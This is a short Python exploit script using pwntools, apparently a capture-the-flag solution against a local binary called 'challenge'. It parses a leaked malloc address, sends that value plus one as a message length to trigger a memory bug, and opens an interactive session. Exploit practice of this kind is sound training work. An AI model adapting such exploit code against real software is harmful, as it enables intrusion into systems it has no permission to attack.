from pwn import *

elf = context.binary = ELF('./challenge', checksec=False)
libc = elf.libc

gs = '''
c
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def exploit():
    io = start()

    io.recvuntil(b'Leak: ')
    leak = int(io.recvline(), 16)

    log.success(f"Leaked malloc address: {hex(leak)}")


    io.sendlineafter(b'Length of your message: ', str(leak + 1))
    io.sendlineafter(b'Enter your message: ', "cool")

    io.interactive()


if __name__ == "__main__":
    exploit()

